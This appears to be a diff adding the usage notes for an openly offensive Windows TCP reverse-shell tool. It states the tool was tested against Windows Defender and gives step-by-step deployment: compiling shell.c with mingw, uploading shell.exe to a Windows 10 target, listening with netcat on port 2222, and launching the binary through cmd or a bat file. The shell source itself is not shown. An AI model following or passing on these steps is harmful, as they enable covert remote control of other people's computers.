@@ -1,0 +1,45 @@
+###
+# Author: r00t-3xp10it
+# Program: Windows TCP Reverse Shell
+# Based on: Ma~Far$ (Yahav N. Hoffmann)
+# Test under: windows 10 with WindowsDefender.
+# Description: template (auto.c) changed to be auto-injected with lhost/lport insted
+# of Hoffmann template that accepts user arguments to execute (agent.exe 192.168.1.71 666).
+###
+
+
+### Prerequisites:
+# mingw-w64 (apt-get install mingw-w64)
+# netcat (apt-get install netcat)
+###
+
+
+### Usage:
+# 1) ./compile.sh shell  
+#    NOTES: to change the name of the binary outcome change shell.c to <file>.c then
+#    run ./compile.sh <file> -OR- you can simply just rename the binary once completed. 
+#
+# 2) Upload or Download shell.exe to Windows 10 system
+# 3) Start Listening  
+#    nc -lvp 2222 
+#    NOTES: this assumes you are going to use port 2222. 
+###
+
+
+### Client Setup (sender)
+# 1) Run Shell.exe
+#    Method 1: Open CMD Navigate to folder holding shell.exe
+#    Run: <filename.exe>
+#
+# 2) Bat file
+#    Method 2: Bat file to execute filename.exe
+#       @echo off
+#       cmd.exe /R start <filename.exe>
+#       exit
+###
+
+
+
+
+
+
